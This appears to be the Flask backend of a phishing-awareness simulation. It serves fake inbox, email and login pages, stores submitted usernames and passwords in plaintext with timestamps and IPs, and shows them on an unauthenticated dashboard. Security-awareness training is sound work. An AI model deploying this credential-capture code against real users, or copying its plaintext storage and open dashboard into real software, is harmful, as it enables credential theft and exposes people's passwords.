from flask import Flask, render_template, request
from datetime import datetime
import sqlite3

app = Flask(__name__)

# ------------------------
# Initialize Database
# ------------------------
def init_db():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        password TEXT,
        time TEXT,
        ip TEXT
    )
    """)

    conn.commit()
    conn.close()

init_db()

# ------------------------
# Routes
# ------------------------

@app.route("/")
def home():
    return "Phishing Awareness System Running Successfully"

@app.route("/inbox")
def inbox():
    return render_template("inbox.html")

@app.route("/email")
def email():
    return render_template("email.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = request.remote_addr

        print(username, password, time, ip)

        # Save to database
        conn = sqlite3.connect("database.db")
        cursor = conn.cursor()

        cursor.execute(
            "INSERT INTO users (username, password, time, ip) VALUES (?, ?, ?, ?)",
            (username, password, time, ip)
        )

        conn.commit()
        conn.close()

        return "⚠ This was a phishing awareness simulation."

    return render_template("login.html")


@app.route("/dashboard")
def dashboard():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("SELECT username, password, time, ip FROM users")
    data = cursor.fetchall()

    conn.close()

    return render_template("dashboard.html", data=data)


@app.route("/clear")
def clear():
    conn = sqlite3.connect("database.db")
    cursor = conn.cursor()

    cursor.execute("DELETE FROM users")

    conn.commit()
    conn.close()

    return "Database cleared!"


if __name__ == "__main__":
    app.run(debug=True)
